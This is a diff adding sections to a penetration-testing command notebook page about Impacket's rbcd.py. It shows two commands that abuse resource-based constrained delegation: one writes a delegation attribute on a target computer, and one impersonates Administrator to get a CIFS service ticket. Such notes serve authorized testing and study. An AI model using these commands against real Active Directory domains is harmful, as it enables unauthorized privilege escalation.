@@ -9,6 +9,32 @@ hideFooterPagination: true
 
 {/* Generated from Commands/rbcd.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## rbcd.py: choose the operation and read the result
+
+Commands and examples collected from your rbcd.py notes.
+
+### What the result establishes
+
+Read the target computer's allowed-to-act descriptor and resolve the principals it authorizes.
+
+### Prerequisites and common failures
+
+Writing the attribute requires an applicable object right, and the controlled principal must meet the delegation flow's prerequisites.
+
+### Example 1: Resource-Based (RBCD)
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```bash
+# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
+rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
+getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your rbcd.py notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=rbcd) · [All tools](/index)
 
 ## Resource-Based (RBCD)
@@ -21,6 +47,21 @@ rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PAS
 getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Delegation: Quick Reference — Example 3: Resource-Based (RBCD)](/active-directory/delegation#example-3-resource-based-rbcd) · [Kerberos Delegation: Quick Reference — Example 1: Resource-Based (RBCD)](/active-directory/delegation#example-1-resource-based-rbcd) · [Kerberos Delegation: Quick Reference — Resource-Based (RBCD)](/active-directory/delegation#resource-based-rbcd)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 Saved as written; may include lab values or terminal output.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Kerberos Delegation: Quick Reference](/active-directory/delegation)
+
+{/* VAULT_RELATED_END */}
